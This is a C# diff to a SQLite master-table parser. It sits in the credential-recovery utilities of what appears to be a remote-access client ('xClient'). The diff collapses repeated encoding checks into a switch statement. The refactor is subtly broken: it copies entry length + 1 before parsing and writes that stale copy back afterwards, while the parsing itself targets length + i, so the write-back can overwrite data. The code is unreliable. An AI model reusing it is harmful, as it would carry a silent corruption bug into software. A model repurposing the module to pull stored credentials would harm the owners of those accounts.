@@ -228,6 +228,7 @@ namespace xClient.Core.Recovery.Utilities
                     long num5 = this.CVL((int)num, endIndex);
                     long[] numArray = new long[5];
                     int index = 0;
+
                     do
                     {
                         endIndex = num6 + 1;
@@ -249,45 +250,63 @@ namespace xClient.Core.Recovery.Utilities
                             numArray[index] = this.SQLDataTypeSize[(int)numArray[index]];
                         }
                         index++;
-                    }
-                    while (index <= 4);
-                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
+                    } while (index <= 4);
+
+                    sqlite_master_entry entry = this.master_table_entries[length + 1];
+
+                    switch (this.encoding)
                     {
-                        this.master_table_entries[length + i].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
+                        case 1:
+                            {
+                                this.master_table_entries[length + i].item_type =
+                                    Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
+
+                                this.master_table_entries[length + i].item_name =
+                                    Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
+
+                                this.master_table_entries[length + i].sql_statement =
+                                    Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num),
+                                                                                              new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
+                                                                                              new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
+                            }
+                            break;
+                        case 2:
+                            {
+                                this.master_table_entries[length + i].item_type =
+                                    Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
+
+                                this.master_table_entries[length + i].item_name =
+                                    Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
+                                                                                              new decimal(numArray[0]))), (int)numArray[1]);
+
+                                this.master_table_entries[length + i].sql_statement =
+                                    Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num),
+                                                                                              new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
+                                                                                              new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
+                            }
+                            break;
+                        case 3:
+                            {
+                                this.master_table_entries[length + i].item_type =
+                                    Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
+
+                                this.master_table_entries[length + i].item_name =
+                                    Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
+                                                                                                       new decimal(numArray[0]))), (int)numArray[1]);
+
+                                this.master_table_entries[length + i].sql_statement =
+                                    Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num),
+                                                                                                       new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
+                                                                                                       new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
+                            }
+                            break;
                     }
-                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
-                    {
-                        this.master_table_entries[length + i].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
-                    }
-                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
-                    {
-                        this.master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
-                    }
-                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
-                    {
-                        this.master_table_entries[length + i].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
-                    }
-                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
-                    {
-                        this.master_table_entries[length + i].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
-                    }
-                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
-                    {
-                        this.master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
-                    }
-                    this.master_table_entries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
-                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
-                    {
-                        this.master_table_entries[length + i].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
-                    }
-                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
-                    {
-                        this.master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
-                    }
-                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
-                    {
-                        this.master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
-                    }
+
+                    this.master_table_entries[length + 1] = entry;
+
+                    this.master_table_entries[length + i].root_num =
+                        (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
+                                                                    new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                 }
             }
             else if (this.db_bytes[(int)Offset] == 5)
